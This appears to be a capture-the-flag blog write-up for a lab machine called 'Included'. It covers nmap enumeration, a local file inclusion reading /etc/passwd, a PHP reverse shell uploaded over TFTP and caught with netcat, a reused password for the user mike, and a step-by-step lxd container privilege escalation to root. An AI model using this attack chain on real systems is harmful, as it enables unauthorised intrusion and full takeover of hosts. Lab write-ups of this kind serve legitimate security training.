---
title: "Writeup: Included"
date: 2021-01-17T19:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - included
  - Linux
  - update
  - nmap
  - passwords
  - lxc
  - dirsearch
  - webshell
  - LFI
  - TFTP
  - PHP Reverse Shell
  - nc
  - upgrade shell
  - nmap
---

Here are notes from the named target:
Target is Linux
Host name Included
IP 10.10.10.55

#Enumeration
Start with simple nmap

```yaml
┌──(root💀kali)-[~]
└─# nmap -A -v 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 20:42 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Initiating Ping Scan at 20:42
Scanning 10.10.10.55 [4 ports]
Completed Ping Scan at 20:42, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:42
Completed Parallel DNS resolution of 1 host. at 20:42, 0.02s elapsed
Initiating SYN Stealth Scan at 20:42
Scanning 10.10.10.55 [1000 ports]
*Discovered open port 80/tcp on 10.10.10.55

```

only port found open was port 80 http so going to try UDP also

```yaml
nmap -sU -v 10.10.10.55
```

#This will take some time so going to check out web site in browser

Look at the webpage does not seem too special so take a look at page source and I see this in the URL block

```yaml
view-source:http://10.10.10.55/?file=index.php#
```

the URL has a tell for possible local file include to try

First it is *PHP

Second it has ?file= in the URL

The common path to check if it is vulnerable to LFI is the *../../../../etc/passwd file path

So by using this URL *http://10.10.10.55/?file=../../../../etc/passwd

We get the password file inserted at the top od the page for viewing. that also tells me if I can get a PHP reverse shell on the site I can use the browd\ser to fire it off

```yaml
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
*lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
*mike:x:1000:1000:mike:/home/mike:/bin/bash
*tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

*Oh look!* we have good intel here 
It has an account for *tftp* - good way to get in. A user account named *mike* and a service called *lxd* which is a service to host virtural file systems in linux like vbox does on laptops. some easy reading indicated this is also a way to do Linux PE to get root if you grt on the box.

We have tftp service running it seems:

```yaml
──(root💀kali)-[~]
└─# nmap -sU -v 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 20:47 EST

`
`
PORT   STATE         SERVICE
*69/udp open|filtered tftp*
```

#Gain a foothold#

I know TFTP is running so going to try and connect to that but need some basic commands

```yaml
Invoking TFTP
To invoke TFTP, enter at the DCL prompt:

TFTP [host [port]]

┌──(root💀kali)-[~]
└─# tftp 10.10.10.55
tftp> help
?Invalid command
tftp> get
(files) 
usage: get host:file host:file ... file, or
       get file file ... file   if connected, or
       get host:rfile lfile
tftp> ls
?Invalid command
tftp> quit
                                                                                             
```
So it is working now test it by using PUT to put a test file on the server in the tftp directory

Make a file locally ant the connect to TFTP and put the file

touch 55test.txt > nano 55test.txt > this is a test file > save

this works too
```yaml
┌──(root💀kali)-[~]
└─# echo "this is a test" > test.txt

```
Now to send it - looks like it worked
```yaml
┌──(root💀kali)-[~]
└─# tftp 10.10.10.55
tftp> put test.txt
Sent 16 bytes in 0.1 seconds
tftp> 

```
##Now to test if I can get to files placed in the tftp folder from the web browser##

##Research:

```yaml
The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default root directory where files will be stored is /var/lib/tftpboot.Nov 19, 2015
```
Yes we can! -- go to URL http://10.10.10.55/?file=../../../../var/lib/tftpboot/test.txt

and View source URL - view-source:http://10.10.10.55/?file=../../../../var/lib/tftpboot/test.txt
```yaml
this is a test
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></titl
...
```

#Foothold with PHP reverse shell#

Locate a good PHP reverse shell - https://github.com/pentestmonkey/php-reverse-shell

save the reverse shell code as 55_rev.php and change the IP and Port to the ones it use

Start netcat locally to listen one another shell *nc -nlvp 4321*

then transfer via tftp the reverse shell php file to the target server
```yaml
┌──(root💀kali)-[/home/kali/http/shell]
└─# tftp 10.10.10.55
tftp> put 55_rev.php
Sent 5678 bytes in 0.9 seconds
tftp> 
```

Now connect to that file in the web browser and watch to get a reverse shell in the netcat session
```yaml
view-source:http://10.10.10.55/?file=../../../../var/lib/tftpboot/55_rev.php



OTHER NC WINDOW
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4321      
listening on [any] 4321 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.55] 49422
Linux included 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:02:14 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

We have a good foothold now lets improve our shell
```yaml
python3 -c "import pty; pty.spawn('/bin/bash')"
```

the www-data account dow not have permissions so we need to try switching to the User Mike. try every knows password from previous servers

su mike
```yaml
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@included:/$ su mike
su mike
Password: Sheffield19

mike@included:/$ 

```
Next I grabbed the flah in Mikes account and then use the TFTP server to pull over the LINUX Enum script file and run it from mikes account

```yaml
┌──(root💀kali)-[/home/kali/http/enum]
└─# tftp 10.10.10.55
tftp> put linenum.sh
Sent 47983 bytes in 5.2 seconds
tftp> 
```
Now that we have linenum.sh copied over to the tftp folder we move it to the home folder of user mike and then make it executable and finally run it. And find out the Mike is in the lxd group and that can be used for PE

```yaml
[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  5  2019 .
drwxr-xr-x 14 root root 4096 Mar  5  2020 ..


[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)


### SCAN COMPLETE ####################################
mike@included:~$

#Priv Elevation#

Research lxd and find best thing to do is to follow instructions here on a new box and then copy the files over to finish the exploit.

```yaml
# lxd/lxc Group - Privilege escalation

If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root

## Exploiting without internet

### Method

You can install in your machine ( I made a second machine for this) this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)\(follow the instructions of the github\):

```yaml
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

##Copy those files to your Kali server for upload to the target
```

Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**

##Use python http server to host the files and WGET to pull them over

Add the image:

```yaml
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

Create a container and add root path

```yaml
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Execute the container:

```yaml
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root/root
id
#Here is where the filesystem is mounted and we can see we are root
```

#this is what it looks like when you run the commands

```yaml
mike@included:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
mike@included:~$ lxc init alpine privesc -c security.privileged=true
lxc init alpine privesc -c security.privileged=true
Creating privesc
mike@included:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
mike@included:~$ lxc start privesc
lxc start privesc
mike@included:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # ^[[21;5Rcd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # ^[[21;18Rls
ls
login.sql  root.txt
/mnt/root/root # ^[[21;18Rcat root.txt
cat root.txt
c693d9c7499d9f572ee375d4c14c7bcf
/mnt/root/root # ^[[21;18Rid
id
uid=0(root) gid=0(root)
/mnt/root/root # ^[[21;18R
```

The last bit is to grab the info in the sql backup file which is the new credentials














































